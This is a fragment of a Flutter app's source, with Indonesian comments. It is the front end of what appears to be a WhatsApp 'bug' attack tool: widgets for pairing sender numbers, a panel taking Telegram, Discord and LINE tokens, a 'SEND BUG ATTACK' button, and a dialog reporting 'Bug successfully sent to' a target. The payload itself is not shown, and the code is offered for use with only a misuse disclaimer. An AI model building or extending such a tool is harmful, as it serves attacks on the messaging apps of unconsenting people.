    return GestureDetector(
      onTap: _isMember ? null : () => setState(() => __senderType = type),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
            color: isSelected
                ? kRed.withOpacity(0.18)
                : Colors.white.withOpacity(0.04),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(
                color: isSelected
                    ? kRed.withOpacity(0.7)
                    : Colors.white.withOpacity(0.1),
                width: isSelected ? 1.5 : 1)),
        child: Column(children: [
          Icon(icon, color: isSelected ? kRedLight : Colors.white38, size: 22),
          const SizedBox(height: 6),
          Text(label,
              style: TextStyle(
                  color: isSelected ? Colors.white : Colors.white54,
                  fontFamily: 'Orbitron',
                  fontSize: 12,
                  fontWeight: isSelected ? FontWeight.bold : FontWeight.normal)),
          const SizedBox(height: 2),
          Text("$count sender",
              style: TextStyle(
                  color: isSelected ? kRedLight.withOpacity(0.8) : Colors.white30,
                  fontFamily: 'ShareTechMono',
                  fontSize: 10)),
        ]),
      ),
    );
  }

  // ─── SENDER MANAGEMENT ────────────────────────────────────────────────────

  Widget _buildSenderManagementCard() {
    return _card(
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          _sectionLabel(FontAwesomeIcons.whatsapp, "Manage Sender"),
          const Spacer(),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
                color: kRed.withOpacity(0.12),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: kRed.withOpacity(0.3))),
            child: Text("${_globalSenders.length} Global",
                style: TextStyle(
                    color: kRedLight,
                    fontSize: 10,
                    fontFamily: 'ShareTechMono',
                    fontWeight: FontWeight.bold)),
          ),
        ]),
        const SizedBox(height: 12),
        _buildAddSenderRow(),
        const SizedBox(height: 10),
        _buildInfoHint("Kamu akan mendapat pairing code setelah pencet +"),
        const SizedBox(height: 12),
        // FIX: Hapus const dari Center/Padding karena kRedLight bukan const
        _isLoadingSenders
            ? Center(
                child: Padding(
                    padding: const EdgeInsets.all(16),
                    child: CircularProgressIndicator(
                        color: kRedLight, strokeWidth: 2)))
            : _buildSenderList(),
      ]),
    );
  }

  Widget _buildMemberPrivateSenderCard() {
    return _card(
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _sectionLabel(FontAwesomeIcons.whatsapp, "My Private Sender"),
        const SizedBox(height: 12),
        _buildAddSenderRow(),
        const SizedBox(height: 10),
        _buildInfoHint("Kamu akan mendapat pairing code setelah pencet +"),
        const SizedBox(height: 12),
        // FIX: Hapus const dari Center/Padding karena kRedLight bukan const
        _isLoadingSenders
            ? Center(
                child: Padding(
                    padding: const EdgeInsets.all(16),
                    child: CircularProgressIndicator(
                        color: kRedLight, strokeWidth: 2)))
            : _buildSenderList(forcePrivate: true),
      ]),
    );
  }

  Widget _buildAddSenderRow() {
    return Row(children: [
      Expanded(
        child: Container(
          decoration: BoxDecoration(
              color: const Color(0xFF0D0000),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: kCardBorder)),
          child: TextField(
            controller: _senderInputController,
            keyboardType: TextInputType.phone,
            style: const TextStyle(
                color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 13),
            cursorColor: kRedLight,
            decoration: InputDecoration(
              hintText: "Nomor WA (e.g. 628xxxx)",
              hintStyle: TextStyle(
                  color: Colors.white.withOpacity(0.35),
                  fontFamily: 'ShareTechMono',
                  fontSize: 12),
              border: InputBorder.none,
              contentPadding:
                  const EdgeInsets.symmetric(horizontal: 12, vertical: 13),
            ),
          ),
        ),
      ),
      const SizedBox(width: 10),
      SizedBox(
        height: 46,
        child: ElevatedButton(
          onPressed: _isAddingSender
              ? null
              : () => _addSender(_senderInputController.text.trim(), _senderType),
          style: ElevatedButton.styleFrom(
              backgroundColor: kRed,
              foregroundColor: Colors.white,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10)),
              padding: const EdgeInsets.symmetric(horizontal: 16)),
          child: _isAddingSender
              ? const SizedBox(
                  width: 18,
                  height: 18,
                  child: CircularProgressIndicator(
                      color: Colors.white, strokeWidth: 2))
              : const Icon(Icons.add, size: 20),
        ),
      ),
    ]);
  }

  Widget _buildSenderList({bool forcePrivate = false}) {
    final type = forcePrivate ? "private" : _senderType;
    final senders = type == "global" ? _globalSenders : _privateSenders;
    final typeName = type == "global" ? "Global" : "Private";
    if (senders.isEmpty) {
      return Container(
        padding: const EdgeInsets.all(18),
        decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.03),
            borderRadius: BorderRadius.circular(10)),
        child: Center(
          child: Column(children: [
            Icon(FontAwesomeIcons.inbox,
                color: Colors.white.withOpacity(0.2), size: 26),
            const SizedBox(height: 8),
            Text("No $typeName Senders",
                style: TextStyle(
                    color: Colors.white.withOpacity(0.4),
                    fontSize: 12,
                    fontFamily: 'ShareTechMono')),
          ]),
        ),
      );
    }
    return ConstrainedBox(
      constraints: const BoxConstraints(maxHeight: 200),
      child: ListView.builder(
        shrinkWrap: true,
        itemCount: senders.length,
        itemBuilder: (_, i) {
          final s = senders[i];
          final num = s['number'] ?? s['sender_number'] ?? 'Unknown';
          return Container(
            margin: const EdgeInsets.only(bottom: 8),
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
            decoration: BoxDecoration(
                color: const Color(0xFF0D0000),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: kCardBorder)),
            child: Row(children: [
              Container(
                  width: 8,
                  height: 8,
                  decoration: const BoxDecoration(
                      color: Colors.green, shape: BoxShape.circle)),
              const SizedBox(width: 10),
              Expanded(
                  child: Text(num,
                      style: const TextStyle(
                          color: Colors.white,
                          fontSize: 13,
                          fontFamily: 'ShareTechMono'))),
              IconButton(
                icon: const Icon(FontAwesomeIcons.trash,
                    color: Colors.red, size: 14),
                onPressed: () => _showDeleteConfirmation(num, type),
                padding: EdgeInsets.zero,
                constraints: const BoxConstraints(),
              ),
            ]),
          );
        },
      ),
    );
  }

  // ─── GLOBAL SENDER PANEL ──────────────────────────────────────────────────

  Widget _buildOpenGlobalSenderBtn() {
    return SizedBox(
      width: double.infinity,
      child: OutlinedButton.icon(
        onPressed: () => setState(() => _showGlobalSenderPanel = true),
        icon: const Icon(FontAwesomeIcons.globe, color: Colors.white70, size: 15),
        label: const Text("OPEN GLOBAL SENDER",
            style: TextStyle(
                fontSize: 12,
                fontFamily: 'Orbitron',
                color: Colors.white70,
                fontWeight: FontWeight.bold)),
        style: OutlinedButton.styleFrom(
            padding: const EdgeInsets.symmetric(vertical: 12),
            side: BorderSide(color: Colors.white.withOpacity(0.2)),
            shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12))),
      ),
    );
  }

  Widget _buildGlobalSenderPanel() {
    return _card(
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          _sectionLabel(FontAwesomeIcons.globe, "Global Message Sender"),
          const Spacer(),
          IconButton(
            icon: const Icon(Icons.close, color: Colors.white54, size: 18),
            onPressed: () => setState(() => _showGlobalSenderPanel = false),
            padding: EdgeInsets.zero,
            constraints: const BoxConstraints(),
          ),
        ]),
        const SizedBox(height: 12),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
          decoration: BoxDecoration(
              color: const Color(0xFF0D0000),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: kCardBorder)),
          child: DropdownButtonHideUnderline(
            child: DropdownButton<String>(
              dropdownColor: const Color(0xFF120000),
              value: _selectedPlatform,
              isExpanded: true,
              iconEnabledColor: kRedLight,
              style: const TextStyle(color: Colors.white, fontSize: 13),
              items: ['Telegram', 'Discord', 'LINE']
                  .map((p) => DropdownMenuItem<String>(
                        value: p,
                        child: Row(children: [
                          Icon(
                              p == 'Telegram'
                                  ? FontAwesomeIcons.telegram
                                  : p == 'Discord'
                                      ? FontAwesomeIcons.discord
                                      : FontAwesomeIcons.line,
                              color: kRedLight,
                              size: 14),
                          const SizedBox(width: 8),
                          Text(p),
                        ]),
                      ))
                  .toList(),
              onChanged: (v) => setState(() => _selectedPlatform = v!),
            ),
          ),
        ),
        const SizedBox(height: 10),
        if (_selectedPlatform == 'Telegram') ...[
          _inputField(_telegramBotTokenController, "Bot Token", isPassword: true),
          const SizedBox(height: 8),
          _inputField(_telegramChatIdController, "Chat ID"),
        ] else if (_selectedPlatform == 'Discord') ...[
          _inputField(_discordWebhookController, "Webhook URL"),
        ] else ...[
          _inputField(_lineTokenController, "Channel Access Token", isPassword: true),
          const SizedBox(height: 8),
          _inputField(_lineUserIdController, "User ID"),
        ],
        const SizedBox(height: 8),
        _inputField(_customMessageController, "Custom Message", maxLines: 3),
        const SizedBox(height: 12),
        SizedBox(
          width: double.infinity,
          height: 44,
          child: ElevatedButton.icon(
            onPressed: _isSendingGlobal ? null : _sendGlobalMessage,
            icon: _isSendingGlobal
                ? const SizedBox(
                    width: 16,
                    height: 16,
                    child: CircularProgressIndicator(
                        color: Colors.white, strokeWidth: 2))
                : const Icon(FontAwesomeIcons.paperPlane,
                    color: Colors.white, size: 14),
            label: Text(
                _isSendingGlobal ? "SENDING..." : "SEND GLOBAL MESSAGE",
                style: const TextStyle(
                    fontSize: 12,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.bold)),
            style: ElevatedButton.styleFrom(
                backgroundColor: Colors.green.withOpacity(0.2),
                foregroundColor: Colors.white,
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                    side: BorderSide(color: Colors.green.withOpacity(0.4)))),
          ),
        ),
      ]),
    );
  }

  Widget _inputField(TextEditingController c, String hint,
      {bool isPassword = false, int maxLines = 1}) {
    return Container(
      decoration: BoxDecoration(
          color: const Color(0xFF0D0000),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: kCardBorder)),
      child: TextField(
        controller: c,
        obscureText: isPassword,
        maxLines: maxLines,
        style: const TextStyle(
            color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 13),
        cursorColor: kRedLight,
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: TextStyle(
              color: Colors.white.withOpacity(0.35),
              fontFamily: 'ShareTechMono',
              fontSize: 12),
          border: InputBorder.none,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 12, vertical: 12),
        ),
      ),
    );
  }

  // ─── SEND BUTTON ──────────────────────────────────────────────────────────

  Widget _buildSendButton() {
    return SizedBox(
      width: double.infinity,
      height: 56,
      child: ElevatedButton.icon(
        onPressed: (_isSending || !_canSendBug) ? null : _sendBug,
        icon: _isSending
            ? const SizedBox(
                width: 20,
                height: 20,
                child: CircularProgressIndicator(
                    color: Colors.white, strokeWidth: 2.5))
            : const Icon(FontAwesomeIcons.rocket, color: Colors.white, size: 18),
        label: Text(
            _isSending
                ? "SENDING..."
                : (_canSendBug ? "SEND BUG ATTACK" : "ACCESS DENIED"),
            style: const TextStyle(
                fontSize: 15,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
                letterSpacing: 1.5,
                color: Colors.white)),
        style: ElevatedButton.styleFrom(
          backgroundColor: kRed,
          disabledBackgroundColor: kRed.withOpacity(0.4),
          foregroundColor: Colors.white,
          shadowColor: kRed.withOpacity(0.4),
          elevation: 8,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        ),
      ),
    );
  }

  // ─── FOOTER ───────────────────────────────────────────────────────────────

  Widget _buildFooter() {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(children: [
        Icon(FontAwesomeIcons.exclamationTriangle,
            color: Colors.white.withOpacity(0.3), size: 12),
        const SizedBox(width: 8),
        Expanded(
          child: Text(
              "Use this tool responsibly. We are not responsible for any misuse.",
              style: TextStyle(
                  color: Colors.white.withOpacity(0.3),
                  fontSize: 10,
                  fontFamily: 'ShareTechMono')),
        ),
      ]),
    );
  }

  // ─── SHARED HELPERS ───────────────────────────────────────────────────────

  Widget _card({required Widget child}) {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
          color: kCard,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: kCardBorder)),
      child: child,
    );
  }

  Widget _sectionLabel(IconData icon, String label) {
    return Row(children: [
      Icon(icon, color: kRedLight, size: 15),
      const SizedBox(width: 8),
      Text(label,
          style: const TextStyle(
              color: Colors.white,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
              fontSize: 14)),
    ]);
  }

  Widget _buildInfoHint(String text) {
    return Row(children: [
      Icon(FontAwesomeIcons.infoCircle, color: kRed.withOpacity(0.5), size: 10),
      const SizedBox(width: 6),
      Expanded(
          child: Text(text,
              style: TextStyle(
                  color: Colors.white.withOpacity(0.35),
                  fontSize: 10,
                  fontFamily: 'ShareTechMono'))),
    ]);
  }

  @override
  void dispose() {
    _senderPollingTimer?.cancel();
    _glowController.dispose();
    _videoController.dispose();
    targetController.dispose();
    _senderInputController.dispose();
    _telegramBotTokenController.dispose();
    _telegramChatIdController.dispose();
    _discordWebhookController.dispose();
    _lineTokenController.dispose();
    _lineUserIdController.dispose();
    _customMessageController.dispose();
    super.dispose();
  }
}

// ============ SUCCESS DIALOG ============

class SuccessVideoDialog extends StatefulWidget {
  final String target;
  final VoidCallback onDismiss;
  const SuccessVideoDialog(
      {super.key, required this.target, required this.onDismiss});

  @override
  State<SuccessVideoDialog> createState() => _SuccessVideoDialogState();
}

class _SuccessVideoDialogState extends State<SuccessVideoDialog>
    with TickerProviderStateMixin {
  Color get kRed      { try { return context.read<ThemeProvider>().primaryColor; } catch(_) { return const Color(0xFFD32F2F); } }
  Color get kRedLight { try { return context.read<ThemeProvider>().accentColor;  } catch(_) { return const Color(0xFFEF5350); } }
  Color get kBg       { try { final tp = context.read<ThemeProvider>(); return tp.isDarkMode ? const Color(0xFF0D0000) : const Color(0xFFF5F5F5); } catch(_) { return const Color(0xFF0D0000); } }

  late VideoPlayerController _successVideoController;
  late AnimationController _fadeController;
  late AnimationController _scaleController;
  late AnimationController _glowController;
  late Animation<double> _fadeAnimation;
  late Animation<double> _scaleAnimation;
  late Animation<double> _glowAnimation;
  bool _showSuccessInfo = false;
  bool _videoError = false;
  bool _videoInitialized = false;

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 500));
    _scaleController = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 800));
    _glowController = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 2000))
      ..repeat(reverse: true);
    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
        CurvedAnimation(parent: _fadeController, curve: Curves.easeIn));
    _scaleAnimation = Tween<double>(begin: 0.8, end: 1.0).animate(
        CurvedAnimation(parent: _scaleController, curve: Curves.elasticOut));
    _glowAnimation = Tween<double>(begin: 0.5, end: 1.0).animate(
        CurvedAnimation(parent: _glowController, curve: Curves.easeInOut));
    _initVideo();
  }

  void _initVideo() {
    try {
      _successVideoController =
          VideoPlayerController.asset('assets/videos/splash.mp4')
            ..initialize().then((_) {
              if (mounted) {
                setState(() => _videoInitialized = true);
                _successVideoController.play();
                _successVideoController.addListener(() {
                  if (_successVideoController.value.position >=
                      _successVideoController.value.duration) {
                    _showSuccessMessage();
                  }
                });
              }
            }).catchError((_) {
              if (mounted) {
                setState(() => _videoError = true);
                Future.delayed(
                    const Duration(milliseconds: 500), _showSuccessMessage);
              }
            });
    } catch (_) {
      if (mounted) {
        setState(() => _videoError = true);
        Future.delayed(const Duration(milliseconds: 500), _showSuccessMessage);
      }
    }
  }

  void _showSuccessMessage() {
    if (mounted) {
      setState(() => _showSuccessInfo = true);
      _fadeController.forward();
      _scaleController.forward();
    }
  }

  @override
  void dispose() {
    _successVideoController.dispose();
    _fadeController.dispose();
    _scaleController.dispose();
    _glowController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final s = MediaQuery.of(context).size;
    return Dialog(
      backgroundColor: Colors.transparent,
      insetPadding: EdgeInsets.zero,
      child: Container(
        width: s.width * 0.9,
        height: s.height * 0.45,
        decoration: BoxDecoration(
            color: const Color(0xFF120000),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: kRed.withOpacity(0.4), width: 1),
            boxShadow: [
              BoxShadow(
                  color: kRed.withOpacity(0.2), blurRadius: 20, spreadRadius: 2)
            ]),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(20),
          child: Stack(fit: StackFit.expand, children: [
            if (!_showSuccessInfo && _videoInitialized && !_videoError)
              FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                    width: _successVideoController.value.size.width,
                    height: _successVideoController.value.size.height,
                    child: VideoPlayer(_successVideoController)),
              ),
            if (!_showSuccessInfo && (_videoError || !_videoInitialized))
              Center(
                  child: AnimatedBuilder(
                animation: _glowAnimation,
                builder: (_, __) => Container(
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                      color: kRed.withOpacity(0.1),
                      shape: BoxShape.circle,
                      border: Border.all(
                          color: kRed.withOpacity(0.3 * _glowAnimation.value),
                          width: 2)),
                  child: Icon(FontAwesomeIcons.check, color: kRedLight, size: 50),
                ),
              )),
            if (_showSuccessInfo)
              FadeTransition(
                opacity: _fadeAnimation,
                child: ScaleTransition(
                  scale: _scaleAnimation,
                  child: Container(
                    color: const Color(0xFF0D0000),
                    padding: const EdgeInsets.all(24),
                    child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          AnimatedBuilder(
                            animation: _glowAnimation,
                            builder: (_, __) => Container(
                              padding: const EdgeInsets.all(16),
                              decoration: BoxDecoration(
                                  color: kRed.withOpacity(0.1),
                                  shape: BoxShape.circle,
                                  border: Border.all(
                                      color: kRed.withOpacity(
                                          0.4 * _glowAnimation.value),
                                      width: 2),
                                  boxShadow: [
                                    BoxShadow(
                                        color: kRed.withOpacity(
                                            0.2 * _glowAnimation.value),
                                        blurRadius: 20,
                                        spreadRadius: 4)
                                  ]),
                              child: Icon(FontAwesomeIcons.checkDouble,
                                  color: kRedLight, size: 36),
                            ),
                          ),
                          const SizedBox(height: 20),
                          const Text("Attack Successful!",
                              style: TextStyle(
                                  color: Colors.white,
                                  fontSize: 20,
                                  fontWeight: FontWeight.bold,
                                  fontFamily: 'Orbitron',
                                  letterSpacing: 2)),
                          const SizedBox(height: 8),
                          Text(
                              "Bug successfully sent to ${widget.target}",
                              style: TextStyle(
                                  color: Colors.white.withOpacity(0.7),
                                  fontSize: 13,
                                  fontFamily: 'ShareTechMono'),
                              textAlign: TextAlign.center),
                          const SizedBox(height: 28),
                          ElevatedButton(
                            onPressed: widget.onDismiss,
                            style: ElevatedButton.styleFrom(
                                backgroundColor: kRed,
                                foregroundColor: Colors.white,
                                padding: const EdgeInsets.symmetric(
                                    horizontal: 40, vertical: 14),
                                shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(30))),
                            child: const Text("DONE",
                                style: TextStyle(
                                    fontSize: 14,
                                    fontWeight: FontWeight.bold,
                                    fontFamily: 'Orbitron',
                                    letterSpacing: 1)),
                          ),
                        ]),
                  ),
                ),
              ),
          ]),
        ),
      ),
    );
  }
}
